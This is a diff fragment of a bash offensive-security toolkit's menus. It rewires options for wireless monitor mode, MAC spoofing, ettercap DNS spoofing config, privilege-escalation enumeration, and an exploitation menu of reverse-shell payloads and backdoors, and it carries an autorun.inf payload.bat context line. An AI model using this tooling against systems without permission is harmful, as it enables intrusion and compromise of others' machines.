+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 04 ${BRed}]${BYellow}╼▰ Down Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 05 ${BRed}]${BYellow}╼▰ Up Interface
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 06 ${BRed}]${BYellow}╼▰ Restart Network-Manager
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 07 ${BRed}]${BYellow}╼▰ Change My hostname
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 08 ${BRed}]${BYellow}╼▰ Change My MAC Address
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 09 ${BRed}]${BYellow}╼▰ Show My Public IP Address
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 10 ${BRed}]${BYellow}╼▰ Find Live Hosts In My Network
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 11 ${BRed}]${BYellow}╼▰ Open My Router Default Page
+    ${DGrey}  |──${BYellow}╼▰ ${BRed}[${BWhite} 12 ${BRed}]${BYellow}╼▰ EdIt etter.dns
+    ${DGrey}  └──${BYellow}╼▰ ${BRed}[${BWhite} 13 ${BRed}]${BYellow}╼▰ Edit etter.conf
 
     ${BGreen}┌──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
@@ -8791,20 +9231,14 @@ MainMenu(){
               read -p "${NetWorKingProMenu}" Anonselc
               case $Anonselc in
                 1)
-                clear
-                ifconfig
+                Info_LocalNet
                 read -p "${Press_ENTER}"
                 ;;
                2)
+
                Enable_Monitor_Mode(){
                  clear
-                 echo "\n"
-                 echo  "    [*] Finding your Network Interfaces... "$GREEN
-                 ifconfig -a | egrep -v 'inet'
-                 echo "\n"
-                 echo  "    [*] Enter Your Interface : "$BLUE
-                 read interface
-                 if [[ $interface = '' ]];then
+                 if [[ $LocalHostNAME = '' ]];then
                    echo "\n"
                    echo "    You Not Enter the Interface !? "
                    echo "\n"
@@ -8814,7 +9248,7 @@ MainMenu(){
                    echo "\n"
                    airmon-ng start $interface
                    echo "\n"
-                   echo "$GREEN    Monitor on $BLUE($RED>$BLUE  $interface $RED <$BLUE)$GREEN has been Enable "
+                   echo "$GREEN    Monitor on ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Enable "
                    echo "\n"
                    read -p "${Press_ENTER}"
                    clear
@@ -8836,7 +9270,7 @@ MainMenu(){
                    echo "\n"
                    airmon-ng stop $interface
                    echo "\n"
-                   echo "$GREEN    Monitor off $BLUE($RED>$BLUE  $interface $RED <$BLUE)$GREEN has been Disabled "
+                   echo "$GREEN    Monitor off ${BBlue}(${BRed}>${BBlue}  $interface ${BRed} <${BBlue})$GREEN has been Disabled "
                    echo "\n"
                    read -p "${Press_ENTER}"
                    clear
@@ -9167,11 +9601,11 @@ open=payload.bat" >> autorun.inf
               done
             ;;
             cli|CLI )
+            mkdir "${MainDirectoriyCaseName}"
+            cd "${MainDirectoriyCaseName}"
             while true; do
-              cd "${x_Menu_1_CLI}"
-              MainDirectoriyCaseNameLocal="${MainDirectoriyCaseName}/Local"
-              mkdir "${MainDirectoriyCaseNameLocal}"
               clear
+              cd "${x_Menu_1_CLI}"
               ToolHeaderRun
               TargetStatusRun
               HacKingProMenuMain=$(echo "${BRed}
@@ -9192,7 +9626,7 @@ open=payload.bat" >> autorun.inf
     ${BYellow}${faintT}|    |──${BRed}[${DGrey} l4 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} CheckMacSec ${BRed}]
     ${BYellow}${faintT}|    |──${BRed}[${DGrey} l5 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} LinuxEnum ${BRed}]
     ${BYellow}${faintT}|    |──${BRed}[${DGrey} l6 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} BasicInfo ${BRed}]
-    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l7 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} UserInfo ${BRed}]
+    ${BYellow}${faintT}|    |──${BRed}[${DGrey} l7 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} GetLocalUserInfo ${BRed}]
     ${BYellow}${faintT}|    |──${BRed}[${DGrey} l8 ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} PackVersion ${BRed}]
     ${BYellow}${faintT}|    ┖──${BRed}[${DGrey} PE ${BRed}]${BYellow}╼▰  ${BRed}[${DGrey} Privilege Escalation ${BRed}]
     ${BYellow}${faintT}|
@@ -9212,18 +9646,19 @@ open=payload.bat" >> autorun.inf
                   break
                   ;;
                   pe|PE|"Privilege Escalation" )
-                  Privileg_Escalation
+                  PrivilegEscalationPro
                   read -p "$Press_ENTER"
                   ;;
                   l0|myip|MyIP )
                   echo "${MainDirectoriyCaseNameLocal}"
-                  echo "$(bash MyIP ip=${targetIP} all)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-MyIP.txt"
+                  bash MyIP >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-MyIP.txt"
                   less "${MainDirectoriyCaseNameLocal}/${targetNAME}-MyIP.txt"
                   read -p "${Press_ENTER}"
                   ;;
                   l1|LinPEAS|linpeas|LinPrivEsc )
                   clear
-                  LinPrivEsc >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-LinPrivEsc.log"
+                  echo "${MainDirectoriyCaseNameLocal}"
+                  touch "${MainDirectoriyCaseNameLocal}/${targetNAME}-LinPrivEsc.log"
                   less -R "${MainDirectoriyCaseNameLocal}/${targetNAME}-LinPrivEsc.log"
                   read -p "${Press_ENTER}"
                   ;;
@@ -9259,8 +9694,8 @@ open=payload.bat" >> autorun.inf
                   ;;
                   l7 )
                   cd "${x_Menu_1_CLI}"
-                  echo "$(UserInfo)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-UserInfo.log"
-                  less -R "${MainDirectoriyCaseNameLocal}/${targetNAME}-UserInfo.log"
+                  echo "$(GetLocalUserInfo)" >> "${MainDirectoriyCaseNameLocal}/${targetNAME}-GetLocalUserInfo.log"
+                  less -R "${MainDirectoriyCaseNameLocal}/${targetNAME}-GetLocalUserInfo.log"
                   read -p "$Press_ENTER"
                   ;;
                   l8 )
@@ -9376,7 +9811,7 @@ open=payload.bat" >> autorun.inf
           read -p "${Press_ENTER}"
           ;;
           12 )
-          Privileg_Escalation
+          PrivilegEscalationPro
           read -p "${Press_ENTER}"
           ;;
           22 )
@@ -9442,6 +9877,7 @@ open=payload.bat" >> autorun.inf
       ;;
       04|4 )
         ExploitationPro() {
+          Info_LocalNet
           while true; do
             clear
             ToolHeaderRun
@@ -9455,34 +9891,57 @@ open=payload.bat" >> autorun.inf
     ${DGrey}┖─┲──╼ ${BRed}[${BYellow} The malware begins executing on the target system ${BRed}]
     ${DGrey}  ┖──╼ ${BRed}[${BYellow} Malware weapon's program code triggers, which takes action on target network to exploit vulnerability. ${BRed}]
 
-    ${ORANGE}┌──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Gateway: ${BGreen}$GAT  ${BRed}]
-    ${ORANGE}|──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Local IP ADDR : ${BGreen}$myip  ${BRed}]
-    ${ORANGE}|──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Interface Use : ${BGreen}$In  ${BRed}]
-    ${ORANGE}└──${BRed}[${ORANGE} ** ${BRed}]${ORANGE}──${resetT}${BYellow}╼▰ ${BRed}[ ${ORANGE}Public IP ADDR: ${BGreen}$myip2  ${BRed}]$RED
+    ${ORANGE}┌─╼ ${BRed}[${LGreen} Gateway ${BRed}]
+    ${ORANGE}┖─┲─╼ ${BRed}[${BGreen} NAME ${BRed}]${LGreen}─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayNAME} ${BRed}]${LGreen}╼▰
+    ${ORANGE}  ┖─╼ ${BRed}[${BGreen} IP ${BRed}]${LGreen}─${resetT}${BYellow}──╼▰ ${resetT}${BRed}[${LGreen} ${DefaultGatewayIP} ${BRed}]${LGreen}╼▰
 
-    ${DGrey}┌──${BRed}[${BWhite} 01 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Linux    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
-    ${DGrey}|──${BRed}[${BWhite} 02 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Android  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoors  ${resetT}${BRed}]
-    ${DGrey}|──${BRed}[${BWhite} 03 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Windows  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
-    ${DGrey}|──${BRed}[${BWhite} 04 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}MacOS    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payload    ${resetT}${BRed}]
-    ${DGrey}└──${BRed}[${BWhite} 05 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}WebShell ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoor   ${resetT}${BRed}]
+    ${LGreen}┌─╼ ${BRed}[${LGreen} Net Card ${BRed}]
+    ${LGreen}┖─┲─╼ ${BRed}[${BGreen} NAME ${BRed}]${LGreen}─${resetT}${BYellow}╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostNAME} ${BRed}]${LGreen}╼▰
+    ${LGreen}  ┖─╼ ${BRed}[${BGreen} IP ${BRed}]${LGreen}─${resetT}${BYellow}──╼▰ ${resetT}${BRed}[${LGreen} ${LocalHostIP} ${BRed}]${LGreen}╼▰
+
+    ${DGrey}┌─╼ ${BRed}[${LGreen} Reverse Shells ${BRed}]
+    ${DGrey}┖─┲─╼${BRed}[${BWhite} 01 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Linux    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
+    ${DGrey}  |──${BRed}[${BWhite} 02 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Android  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoors  ${resetT}${BRed}]
+    ${DGrey}  |──${BRed}[${BWhite} 03 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}Windows  ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payloads   ${resetT}${BRed}]
+    ${DGrey}  |──${BRed}[${BWhite} 04 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}MacOS    ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Payload    ${resetT}${BRed}]
+    ${DGrey}  └──${BRed}[${BWhite} 05 ${BRed}]${BGreen}──${resetT}${BYellow}╼▰   ${BRed}[ ${BYellow}WebShell ${BRed}]${BGreen}──${resetT}${BYellow}╼▰ ${BRed}[${BYellow}${faintT} Backdoor   ${resetT}${BRed}]
 
     ${BGreen}┌──${BRed}[${BCyan} Arsenal ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BCyan} Cheat Sheets ${BRed}]${BGreen}───${resetT}${BYellow}╼▰  ${BRed}[${BGreen} Command ${BRed}]${BYellow}╼▰  ${BRed}[${LGreen} $ArsenalCommand ${BRed}]
     ${BGreen}|
     ${BGreen}|──${BRed}[${DGrey} ~$(pwd) ${BRed}]
     ${BGreen}|
-    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Anonymity ${BRed}]${BYellow}╼▰  ${BGreen}   ")
+    ${BGreen}└──${BRed}[${BYellow} $Anlominus ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} ${HacKingPro} ${BRed}]${BYellow}╼▰  ${BRed}[${BGreen} Exploitation   ${BRed}]${BYellow}╼▰  ${BGreen}   ")
             read -p "$HacKingProMenuMain" cmd
           case $cmd in
-          1)wine ;;
-          2)linu ;;
-          3)mac ;;
-          4)android ;;
-          5)java ;;
-          6)web ;;
-          7)wiri ;;
-          8)fireadd ;;
-          9)webdd ;;
-          10)otherexploit ;;
+          1)
+          wine
+          ;;
+          2)
+          AndroidPayLoadPro
+          ;;
+          3)
+          Mac
+          ;;
+          4)
+                    ;;
+          5)
+          java
+          ;;
+          6)
+          web
+          ;;
+          7)
+          wiri
+          ;;
+          8)
+          fireadd
+          ;;
+          9)
+          webdd
+          ;;
+          10)
+          otherexploit
+          ;;
           p|P )
           HacKingProPlanning
           ;;
